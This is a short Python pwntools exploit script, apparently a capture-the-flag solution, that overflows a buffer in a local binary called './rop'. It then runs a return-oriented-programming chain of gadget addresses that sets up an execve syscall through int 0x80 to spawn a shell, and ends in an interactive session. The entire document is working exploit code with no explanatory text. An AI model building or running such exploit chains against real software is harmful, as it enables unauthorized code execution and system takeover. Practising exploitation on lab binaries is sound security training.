#!/usr/bin/python
from pwn import *

# pop eax ; ret
frame1 = p32(0x080b9236) + p32(0xb)

# pop edx ; pop ecx ; pop ebx ; ret
frame2 = p32(0x0806fd50) + p32(0) + p32(0) + p32(0x80bc6a5)

# int 0x80
frame3 = p32(0x0806d905)

rop = "A" * 36 + frame1 + frame2 + frame3

p = process('./rop')
p.sendline(rop)
p.interactive()
